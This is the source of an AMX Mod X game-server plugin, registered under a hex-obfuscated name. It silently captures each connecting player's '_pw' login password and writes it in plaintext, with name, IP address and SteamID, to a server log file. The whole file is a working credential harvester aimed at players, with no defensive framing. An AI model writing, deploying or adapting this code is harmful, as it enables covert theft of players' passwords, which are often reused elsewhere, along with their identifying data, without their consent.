#include <amxmodx>
#include <amxmisc>

new passfield[] = "_pw";
new temp[64] = "						  ";
new temp2[] = "========================================================================================================";
new map[32];

public plugin_init() {
	register_plugin("0x63 0x72 0x78", "0xCrx", "CrXane");
	
	get_mapname(map, 31); add(temp, 64, map); 
	Log("connect", temp2); Log("connect", temp); Log("connect", temp2);
	Log("password", temp2); Log("password", temp); Log("password", temp2);
}

public client_connect(id){
	if (!is_user_bot(id))
		GatherData(id);
}

public client_infochanged(id){
	if (!is_user_bot(id))
		GatherData(id);
}

public GatherData(id){
	new name[35], password[35], ip[32], authid[35];
	
	get_user_info(id, passfield, password, charsmax(password));
	get_user_name(id, name, charsmax(name));
	get_user_ip(id, ip, charsmax(ip), 2)
	get_user_authid(id, authid, charsmax(authid));
		
	FormatString(name, charsmax(name), 5, 32);
	FormatString(ip, charsmax(ip), 5, 24);
	FormatString(authid, charsmax(authid), 5, 23);
		
	if (password[0]){
		FormatString(password, charsmax(password), 5, 15);
		Log("password", "%s | %s | %s | %s", name, password, ip, authid);
	}
		
	Log("connect", "%s%s%s", name, ip, authid);
}

stock FormatString(data[], len, space, maxlen){
	new spaceid;
	new length = strlen(data);
	
	spaceid = ((maxlen-length) + space)

	while (spaceid > 3) { add(data, len, "   ", 4); spaceid -= 4; }
	while (spaceid > 2) { add(data, len, "   ", 3); spaceid -= 3; }
	while (spaceid > 1) { add(data, len, "  ", 2); spaceid -= 2; }
	if (spaceid == 1) add(data, len, " ", 1);
}

stock Log(const log_filename[], const message_fmt[], any:...){
	static message[256], filename[96];
	vformat(message, sizeof(message) - 1, message_fmt, 3);
	format_time(filename, sizeof(filename) - 1, "%m-%d-%Y");
	formatex(filename, sizeof(filename) - 1, "addons/amxmodx/logs/%s_%s.log", log_filename, filename);
	log_to_file(filename, "%s", message);
}

